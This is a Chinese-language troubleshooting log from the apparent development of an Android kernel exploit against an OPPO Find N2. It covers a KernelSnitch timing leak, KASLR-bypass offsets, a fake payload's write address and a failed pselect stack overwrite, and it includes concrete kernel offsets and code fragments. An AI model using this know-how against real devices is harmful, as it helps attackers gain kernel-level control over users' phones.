# 问题排查手册

## 文档说明

本文档收录了开发过程中遇到的所有问题及其解决方案。按类型分类，每条问题包含触发场景、报错信息、排查思路和解决方案。

---

## 编译/构建报错类

### 1. `offset.h` 编译错误: 未定义的偏移量

**触发场景**: 编译 exploit 时缺少 `TARGET_CONFIG_H` 宏定义

**完整报错信息**:
```
error: use of undeclared identifier 'ASHMEM_MISC_FOPS_OFF'
```

**解决方案**:

Makefile 中自动定义 `TARGET_CONFIG_H`:
```makefile
CFLAGS = ... -DTARGET_CONFIG_H='"$(TARGET_DIR)/target.h"'
```

---

### 2. `__measure` 隐式声明错误

**触发场景**: 在 `kernelsnitch.h` 中调用 `__measure()` 但函数定义在调用之后

**完整报错信息**:
```
error: implicit declaration of function '__measure'
note: previous implicit declaration is here
```

**解决方案**:

在文件开头添加前向声明:
```c
static size_t __measure(size_t futex_addr);
```

---

### 3. shadow stack OOM

**触发场景**: 使用 android35 以外的 NDK 版本编译

**完整报错信息**:
```
ld.lld: error: shadow stack too large
```

**解决方案**:

使用 NDK r29 的 `aarch64-linux-android35-clang`:
```bash
make NDK=/tmp/ndk_extract/android-ndk-r29
```

---

### 4. SLIDE_* 定义缺失编译错误

**触发场景**: PR #13 移除了 SLIDE_* 定义但 util.c/fops.c 仍引用

**完整报错信息**:
```
error: use of undeclared identifier 'SLIDE_NFULNL_LOGGER_IMAGE'
error: use of undeclared identifier 'SLIDE_RANDOM_BOOT_ID_DATA_IMAGE'
```

**解决方案**:

在 target.h 中添加回 SLIDE_* 定义:
```c
#define SLIDE_NFULNL_LOGGER_OFF 0x027c14b8ULL
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x02b99b6dULL
#define SLIDE_NFULNL_LOGGER_IMAGE (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
```

---

## 运行时异常类

### 5. KernelSnitch mm_struct leak failed

**触发场景**: bruteforce 扫描错误的 IDENTITY 范围

**完整报错信息**:
```
[*] start finding mm_struct [ffffffc000000000-ffffffc080000000]
...
[-] KernelSnitch mm_struct leak failed
```

**解决方案**:

修改 `target.h`:
```c
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END 0xffffffc000000000ULL
```

---

### 6. pile-up timing ratio ~1.0x

**触发场景**: pile-up 不完整，线程未全部 block

**完整报错信息**:
```
[*] pile-up verified: approx_time=260 baseline=260 ratio=1.0
```

**解决方案**:

修改 `__increase()`:
```c
for (size_t i = 0; i < 16; ++i) sched_yield();
size_t approx_time = __measure((size_t)&ks->inc_futex[id]);
```

---

### 7. slide pselect crash (waiter offset mismatch)

**触发场景**: NFDS=320 时，waiter 在 fd_set 数据下方 120 字节

**完整报错信息**:
```
[*] slide pselect before fd install nfds=320
[*] slide pselect after fd install
[*] slide pselect before syscall
[*] slide consumer before tgkill tid=... calls=0
// 然后设备重启
```

**解决方案**:

> [!WARNING]
> 当前无解决方案。slide 机制在 OPPO Find N2 上不可行，因为 waiter 在 fd_set 数据下方，fd_set bitmaps 无法到达 waiter 位置。

**根因分析**:
- fd_set 数据: stack_top - 0x210 (core_sys_select SP+0x50)
- waiter: stack_top - 0x288 (do_select 帧内)
- 偏移差: 0x78 (120 bytes)
- fd_set bitmaps 从 stack_top - 0x210 向上增长，无法覆盖 stack_top - 0x288

---

### 8. fake payload 地址错误

**触发场景**: PR #13 移除 SLIDE_* 定义后 fake payload 使用错误地址

**完整报错信息**:
```
[*] write_left=ffffff802a2c0048  ← 应该是 0xffffff802ab99b6d
```

**解决方案**:

使用 `P0_DATA_ALIAS_CONST` 宏计算正确的 direct-map 地址:
```c
write_left = P0_DATA_ALIAS_CONST(KIMAGE_TEXT_BASE + 0x02b99b6d);
```

---

## 功能异常类

### 9. slide pselect 走 kvmalloc 路径

**触发场景**: NFDS ≥ 321 导致 v17 ≥ 43

**完整报错信息**:
```
[*] slide pselect before fd install nfds=640
// 然后设备重启
```

**解决方案**:

保持 NFDS ≤ 320 (栈路径)，但 waiter 偏移问题仍然存在。

---

## 性能问题类

### 10. bruteforce 耗时过长

**触发场景**: IDENTITY 范围过大 (16GB) 或碰撞数不足

**解决方案**:

- 确保 IDENTITY 范围正确 (`0xffffff80-0xffffffc0`)
- 增加 `KSNITCH_COLLISIONS` 到 16
- 使用 8 个线程并行 bruteforce
